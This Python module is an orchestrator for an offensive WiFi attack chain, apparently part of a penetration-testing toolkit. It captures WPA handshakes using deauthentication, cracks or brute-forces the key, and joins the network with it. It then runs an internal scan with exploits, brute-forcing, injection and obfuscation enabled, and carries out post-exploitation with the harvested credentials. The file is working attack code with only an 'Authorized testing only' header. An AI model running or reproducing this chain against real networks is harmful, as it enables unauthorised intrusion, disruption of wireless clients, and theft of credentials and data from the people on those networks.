"""
WiFi Red Team - Full external attack chain orchestrator.
Phases: WiFi Recon -> Handshake Capture -> Crack Key -> Auto-Connect -> Internal Pen-Test -> Post-Exploit -> Report
WARNING: Authorized testing only.
"""

import json
import time
from dataclasses import dataclass, field
from datetime import datetime
from pathlib import Path
from typing import Callable, Optional

from scanner.wifi_attack import (
    SCAPY_AVAILABLE,
    HandshakeCapture,
    check_monitor_support,
    enable_monitor_mode,
    disable_monitor_mode,
    scan_target_channel,
    capture_handshake,
    detect_wps,
    list_wireless_interfaces,
)
from scanner.wifi_crack import CrackResult, crack_handshake, online_wifi_bruteforce
from scanner.wifi_connect import ConnectionResult, connect_to_wifi, wait_for_dhcp, get_target_subnet, disconnect_from_wifi


SCANS_DIR = Path(__file__).resolve().parent.parent / "scans"


@dataclass
class RedTeamResult:
    ssid: str = ""
    bssid: str = ""
    wifi_key: str = ""
    connected: bool = False
    interface: str = ""
    ip: str = ""
    subnet: str = ""
    gateway: str = ""
    handshake_path: str = ""
    crack_method: str = ""
    crack_duration: float = 0.0
    scan_report: Optional[dict] = None
    post_exploit_findings: list = field(default_factory=list)
    phases: list = field(default_factory=list)
    error: str = ""
    duration: float = 0.0


def run_wifi_redteam(
    target_bssid: str,
    target_ssid: str,
    interface: Optional[str] = None,
    use_ai: bool = True,
    wordlist_path: Optional[str] = None,
    max_crack_time: int = 3600,
    post_exploit: bool = True,
    on_phase: Optional[Callable[[str, str], None]] = None,
    report_path: Optional[str] = None,
) -> RedTeamResult:
    """
    Full external red-team WiFi attack chain.

    1. Detect monitor-capable interface
    2. Enable monitor mode
    3. Lock to target channel
    4. Capture handshake (with deauth)
    5. Disable monitor mode
    6. Crack handshake (built-in + AI wordlist + user wordlist)
    7. Auto-connect to WiFi
    8. Wait for DHCP, discover subnet
    9. Run internal pen-test (pentest profile, scan_all, include_router)
    10. Post-exploitation recon
    11. Report everything
    """
    result = RedTeamResult(ssid=target_ssid, bssid=target_bssid)
    start_time = time.time()

    def _phase(name: str, detail: str = ""):
        msg = f"[PHASE] {name}" + (f" - {detail}" if detail else "")
        print(msg)
        result.phases.append({"phase": name, "detail": detail, "time": time.time() - start_time})
        if on_phase:
            on_phase(name, detail)

    if not report_path:
        SCANS_DIR.mkdir(parents=True, exist_ok=True)
        safe_ssid = "".join(c if c.isalnum() or c in "-_" else "_" for c in target_ssid)
        report_path = str(SCANS_DIR / f"redteam_{safe_ssid}_{int(time.time())}.json")

    # ── Phase 1: Detect wireless interface ──────────────────────────
    _phase("Interface Detection", "Looking for wireless adapter")
    if not interface:
        interfaces = list_wireless_interfaces()
        if not interfaces:
            result.error = "No wireless interfaces detected."
            _phase("Error", result.error)
            _save_result(result, report_path, start_time)
            return result
        interface = interfaces[0]["name"]
        _phase("Interface Detection", f"Using interface: {interface}")

    # ── Decide attack strategy: monitor-mode (offline) or online brute-force ──
    use_monitor = False
    if SCAPY_AVAILABLE:
        supported, reason = check_monitor_support(interface)
        if supported:
            use_monitor = True
            _phase("Interface Detection", f"Monitor mode supported: {reason}")
        else:
            _phase("Interface Detection", f"Monitor mode unavailable: {reason}")
    else:
        _phase("Interface Detection", "Scapy not installed - monitor mode unavailable")

    if use_monitor:
        # ── OFFLINE PATH: monitor mode → handshake → crack ────────────
        crack_result = _attack_offline(
            interface, target_bssid, target_ssid,
            use_ai, wordlist_path, result, _phase,
        )
    else:
        # ── ONLINE FALLBACK: try connecting with each password ────────
        _phase("Fallback", "Switching to online brute-force (no monitor mode)")
        _phase("Fallback", "This tries each password by connecting directly - slower but works everywhere")
        crack_result = online_wifi_bruteforce(
            ssid=target_ssid,
            bssid=target_bssid,
            use_ai=use_ai,
            user_wordlist=wordlist_path,
            interface=interface,
            on_progress=lambda msg: print(f"    {msg}"),
        )
        result.crack_method = crack_result.method
        result.crack_duration = crack_result.duration

    if not crack_result.cracked:
        extra = f" Handshake saved at {result.handshake_path} for offline cracking." if result.handshake_path else ""
        result.error = f"Could not crack the WiFi key. Method: {crack_result.method}.{extra}"
        _phase("Crack Key", result.error)
        _save_result(result, report_path, start_time)
        return result

    result.wifi_key = crack_result.psk
    _phase("Crack Key", f"KEY FOUND: {crack_result.psk} ({crack_result.method}, {crack_result.duration:.1f}s)")
    print(f"\n{'='*50}")
    print(f"  WiFi KEY: {crack_result.psk}")
    print(f"{'='*50}\n")

    # Phase 7: Auto-connect
    _phase("Connect", f"Connecting to {target_ssid} with cracked key")
    connected, conn_iface = connect_to_wifi(target_ssid, crack_result.psk, interface)
    if not connected:
        result.error = f"Cracked key but failed to connect to {target_ssid}."
        _phase("Error", result.error)
        _save_result(result, report_path, start_time)
        return result
    result.connected = True
    result.interface = conn_iface
    _phase("Connect", f"Connected on {conn_iface}")

    # Phase 8: DHCP + subnet discovery
    _phase("Network Discovery", "Waiting for DHCP...")
    dhcp = wait_for_dhcp(conn_iface, timeout=30)
    if not dhcp:
        result.error = "Connected but DHCP timed out. No IP assigned."
        _phase("Error", result.error)
        disconnect_from_wifi(target_ssid, conn_iface)
        _save_result(result, report_path, start_time)
        return result

    ip, mask, gateway = dhcp
    result.ip = ip
    result.gateway = gateway
    subnet = get_target_subnet(conn_iface)
    result.subnet = subnet or f"{ip}/24"
    _phase("Network Discovery", f"Got IP {ip}, subnet {result.subnet}, gateway {gateway}")
    print(f"\n{'='*50}")
    print(f"  ON THE NETWORK: {result.subnet}")
    print(f"  Our IP: {ip}  Gateway: {gateway}")
    print(f"{'='*50}\n")

    # Phase 9: Internal pen-test
    _phase("Internal Pen-Test", f"Starting full scan of {result.subnet}")
    scan_report_path = str(Path(report_path).parent / "redteam_internal_scan.json")
    try:
        from main import run_scan
        run_scan(
            target=result.subnet,
            skip_discovery=False,
            scan_all=True,
            report_path=scan_report_path,
            show_progress=True,
            profile="pentest",
            exploit=True,
            bruteforce=True,
            ssl_check=True,
            ssh_audit=True,
            web_deep=True,
            injection=True,
            web_advanced=True,
            include_router=True,
            use_ai_wordlist=use_ai,
            write_report_after_each_host=True,
            obfuscate=True,
        )
        if Path(scan_report_path).exists():
            with open(scan_report_path, encoding="utf-8") as f:
                result.scan_report = json.load(f)
            host_count = len(result.scan_report.get("hosts", []))
            _phase("Internal Pen-Test", f"Complete - {host_count} host(s) scanned")
        else:
            _phase("Internal Pen-Test", "Scan completed but no report generated")
    except Exception as e:
        _phase("Internal Pen-Test", f"Error: {e}")

    # Phase 10: Post-exploitation
    if post_exploit and result.scan_report:
        _phase("Post-Exploitation", "Enumerating accessible services with cracked credentials")
        try:
            from scanner.post_exploit import run_post_exploit
            hosts = result.scan_report.get("hosts", [])
            for host_data in hosts:
                host_ip = host_data.get("host", "")
                exploits = host_data.get("exploits", [])
                brute_results = [e for e in exploits if "Brute" in (e.get("check", "") or "")]
                if brute_results:
                    @dataclass
                    class _BruteResult:
                        success: bool = True
                        port: int = 0
                        service: str = ""
                        username: str = ""
                        password: str = ""
                    parsed = []
                    for br in brute_results:
                        details = br.get("details", "")
                        if ":" in details:
                            u, p = details.split(":", 1)
                            port = 22
                            for f in host_data.get("findings", []):
                                if f.get("service", "").lower() in ("ssh", "ftp", "mysql", "http"):
                                    port = f.get("port", 22)
                                    break
                            parsed.append(_BruteResult(success=True, port=port, service="SSH",
                                                       username=u.strip(), password=p.strip()))
                    if parsed:
                        pe_findings = run_post_exploit(
                            host=host_ip,
                            brute_results=parsed,
                            open_ports=host_data.get("open_tcp", []),
                            on_progress=lambda msg: print(f"    {msg}"),
                        )
                        for pf in pe_findings:
                            result.post_exploit_findings.append({
                                "host": pf.host, "port": pf.port, "service": pf.service,
                                "username": pf.username, "access_level": pf.access_level,
                                "details": pf.details, "severity": pf.severity,
                            })
            if result.post_exploit_findings:
                _phase("Post-Exploitation", f"Found {len(result.post_exploit_findings)} accessible service(s)")
            else:
                _phase("Post-Exploitation", "No additional accessible services found")
        except Exception as e:
            _phase("Post-Exploitation", f"Error: {e}")

    # Cleanup
    _phase("Cleanup", f"Disconnecting from {target_ssid}")
    disconnect_from_wifi(target_ssid, conn_iface)

    # Save final result
    _save_result(result, report_path, start_time)
    return result


def _attack_offline(
    interface: str,
    target_bssid: str,
    target_ssid: str,
    use_ai: bool,
    wordlist_path: Optional[str],
    result: RedTeamResult,
    _phase: Callable,
) -> CrackResult:
    """Monitor-mode attack path: enable mon → capture handshake → crack offline."""
    _phase("Monitor Mode", f"Enabling on {interface}")
    mon_success, mon_iface = enable_monitor_mode(interface)
    if not mon_success:
        _phase("Monitor Mode", f"Failed to enable: {mon_iface} - falling back to online brute-force")
        return online_wifi_bruteforce(
            ssid=target_ssid, bssid=target_bssid, use_ai=use_ai,
            user_wordlist=wordlist_path, interface=interface,
            on_progress=lambda msg: print(f"    {msg}"),
        )
    result.interface = mon_iface
    _phase("Monitor Mode", f"Active on {mon_iface}")

    try:
        _phase("Channel Lock", f"Finding channel for {target_bssid}")
        channel = scan_target_channel(mon_iface, target_bssid, timeout=15)
        if channel:
            _phase("Channel Lock", f"Target on channel {channel}")
        else:
            _phase("Channel Lock", "Could not determine channel; will hop during capture")

        _phase("Handshake Capture", f"Listening for WPA handshake from {target_bssid} ({target_ssid})")
        hs = capture_handshake(
            interface=mon_iface,
            bssid=target_bssid,
            ssid=target_ssid,
            timeout=120,
            deauth=True,
            on_progress=lambda msg: print(f"    {msg}"),
        )
        result.handshake_path = hs.pcap_path

        if not hs.pcap_path:
            _phase("Handshake Capture", "No handshake captured - falling back to online brute-force")
            disable_monitor_mode(mon_iface)
            return online_wifi_bruteforce(
                ssid=target_ssid, bssid=target_bssid, use_ai=use_ai,
                user_wordlist=wordlist_path, interface=interface,
                on_progress=lambda msg: print(f"    {msg}"),
            )

        if hs.complete:
            _phase("Handshake Capture", f"Complete handshake captured ({hs.messages_captured} msgs)")
        else:
            _phase("Handshake Capture", f"Partial handshake ({hs.messages_captured} msgs) - attempting crack anyway")

    finally:
        _phase("Monitor Mode", "Restoring managed mode")
        disable_monitor_mode(mon_iface)

    _phase("Crack Key", "Starting offline key cracking")
    crack_result = crack_handshake(
        pcap_path=hs.pcap_path,
        ssid=target_ssid,
        bssid=target_bssid,
        use_ai=use_ai,
        user_wordlist=wordlist_path,
        on_progress=lambda msg: print(f"    {msg}"),
    )
    result.crack_method = crack_result.method
    result.crack_duration = crack_result.duration
    return crack_result


def _save_result(result: RedTeamResult, report_path: str, start_time: float):
    """Persist the red-team result to a JSON report."""
    result.duration = time.time() - start_time

    report = {
        "target": f"{result.ssid} ({result.bssid})",
        "scan_type": "WiFi Red Team",
        "timestamp": datetime.now().isoformat(),
        "wifi": {
            "ssid": result.ssid,
            "bssid": result.bssid,
            "key": result.wifi_key,
            "connected": result.connected,
            "interface": result.interface,
            "ip": result.ip,
            "subnet": result.subnet,
            "gateway": result.gateway,
            "handshake_path": result.handshake_path,
            "crack_method": result.crack_method,
            "crack_duration": result.crack_duration,
        },
        "phases": result.phases,
        "hosts": (result.scan_report or {}).get("hosts", []),
        "post_exploit": result.post_exploit_findings,
        "error": result.error,
        "duration_seconds": result.duration,
    }

    try:
        Path(report_path).parent.mkdir(parents=True, exist_ok=True)
        with open(report_path, "w", encoding="utf-8") as f:
            json.dump(report, f, indent=2)
        print(f"\nRed team report saved to: {report_path}")
    except Exception as e:
        print(f"Failed to write report: {e}")

    # Summary
    print(f"\n{'='*60}")
    print("RED TEAM SUMMARY")
    print(f"{'='*60}")
    print(f"  Target:     {result.ssid} ({result.bssid})")
    if result.wifi_key:
        print(f"  WiFi Key:   {result.wifi_key}")
    if result.connected:
        print(f"  Connected:  Yes (IP: {result.ip}, Subnet: {result.subnet})")
    if result.scan_report:
        hosts = result.scan_report.get("hosts", [])
        print(f"  Hosts:      {len(hosts)} scanned")
    if result.post_exploit_findings:
        print(f"  Post-Exploit: {len(result.post_exploit_findings)} accessible service(s)")
    if result.error:
        print(f"  Error:      {result.error}")
    print(f"  Duration:   {result.duration:.1f}s")
    print(f"{'='*60}")
